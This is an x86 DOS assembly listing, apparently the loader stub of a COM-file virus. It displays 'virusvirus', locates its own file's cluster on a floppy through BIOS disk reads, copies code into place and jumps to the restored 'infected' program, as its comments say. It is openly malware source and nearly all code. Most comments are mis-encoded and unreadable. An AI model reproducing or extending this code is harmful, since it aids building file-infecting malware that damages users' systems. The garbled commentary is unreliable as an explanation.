org 100h
DispStr:
	mov	ax, Msg
	mov	bp, ax			; ES:BP = ����ַ
	mov	cx, 10			; CX = ������
	mov	ax, 01301h		; AH = 13,  AL = 01h
	mov	bx, 000ch		; ҳ��Ϊ0(BH = 0) �ڵ׺���(BL = 0Ch,����
	mov	dl, 8
	mov     dh, 3
	int	10h			; 10h ���ж�
;;;;;;;;;;;;;
push path
push ds
call GetExeName
pop ds
add sp,2

call FindExeCluster

push ax

mov di, $$ + 0200h
mov si, MovedCode
mov cx, movedcount

call Memove
jmp $$ + 0200h; jmp to movedcode which copied to 100h + 200h

MovedCode:
xor ah, ah ; reset drive
xor dl, dl
int 13h

pop ax;get sector which is pushed after ResumeInfectedFile
mov cl, 1
mov bx, $$;������Ⱦ��������ݼ��ص�100h��ȥִ��֮
call ReadSector
mov ax, $$
jmp ax; �����ָ��ı���Ⱦ�ļ�����ȥִ�ж�com����100h,��Ҫֱ����jmp $$��Ϊ��������ƫ�ƣ��������Ǩ�����ƫ����Ҫ�޶���

ReadSector:;�ú����ľ����������Ǵ�0��ʼ��
;ax ����������, cl ��ȡ���������� , bx ������
push bp
mov bp, sp
sub sp, 2
push bx
mov byte [bp - 2], cl
mov bl, 18
div bl
inc ah; sectorno
mov cl, ah; set sectorno
mov dh, al
and dh, 1; hdr
shr al, 1; trackno track�ڴ����ļ����ǰ�ͬtrackno�����д�ͷ��������ţ���Ϊ����2��ͷ�����Գ���2
mov ch, al;set track no 
mov dl, 0; drive 0
pop bx
mov ah, 02h; read
mov al, [bp - 2]; read [bp-2] sectors
int 13h
add sp, 2
pop bp
ret

movedcount equ $ - MovedCode



GetExeName:
push bp
mov bp,sp
mov ax,[2ch]
mov ds,ax
xor bx,bx
find_00:
mov ax,[bx]
inc bx
test ax,ax
jnz find_00
add bx,3;����ʣ�µ�һ��0���������ֽ�

;�ƶ����ļ����һ���ֽ�
move_end:
mov al,byte [bx]
inc bx
test al,al
jnz move_end
sub bx,2;bx��ƫ�����ļ������һ���ֽ�

;���ƶ�����һ��'\'
find_xie:
mov al,byte[bx]
dec bx
test al,al
jz find_xie_end;������Ǿ���·�����򲻿����ҵ��ֺ�
cmp al,'\'
jnz find_xie
find_xie_end:
add bx,2;��ʱbx�����ļ�����ʼ��ƫ��
mov si,[bp+6]
mov es,[bp+4];��Ϊ����һ��ʼѹ��bp����ջҪ���һ��
copy_name:
mov al,[bx]
cmp al,'.';�����ļ�����׺��'.'������
jz Skip
test al,al
jz copy_name_end
mov [es:si],al
inc si
Skip:
inc bx
jmp copy_name
copy_name_end:
pop bp
ret


FindExeCluster:
push bp
mov bp,sp
sub sp,2;�����ۼӲ��Ҹ�Ŀ¼��
sub sp,512;���ڴ�Ŷ�ȡ������
mov ax,19;��Ŀ¼λ�ڵ�19����
mov cl,1
lea bx,[bp-512]
call ReadSector

mov al,1
mov [bp-512-2],al;[bp-512-2]+19ΪĿǰ���Աȵ����ƫ��
copypath:
mov al,[bp-512-2]
mov dx,32
mul dx
mov si,bx
add si,ax;dx���ĿǰҪ���Ƶ����ƫ��
mov di,pathcopy
copystart:
mov al,[si]
test al,al
jz compare
cmp al,' '
jz SkipCopy
mov [di],al
inc di
SkipCopy:
inc si
jmp copystart

compare:
mov [di],al;���ַ�����00��β
call strCmp
test ax,ax
jz notFind
mov ax,[bp-512-2]
mov dx,32
mul dx
lea bx,[bp-512]
mov si,bx
add si,ax
add si,20
mov ax,word [si]
add ax,31;ת��Ϊ����������
mov sp,bp
pop bp
ret
notFind:
add word [bp-512-2],1
jmp copypath


strCmp:
push bp
mov bp, sp
push si
push di
mov si, path
mov di, pathcopy
_loop_cmp:
mov al, [si]
cmp al, [di]
jz _cmp_matched
xor ax, ax
jmp _cmp_end
_cmp_matched:
inc si
inc di
test al, al
jnz _loop_cmp
mov ax, 1
_cmp_end:
pop di
pop si
pop bp
ret

Memove:

mov al, [si]
mov  [di], al
inc di
inc si
dec cx
jnz Memove
ret


Msg db "virusvirus"
path times 16 db 0
pathcopy times 16 db 0

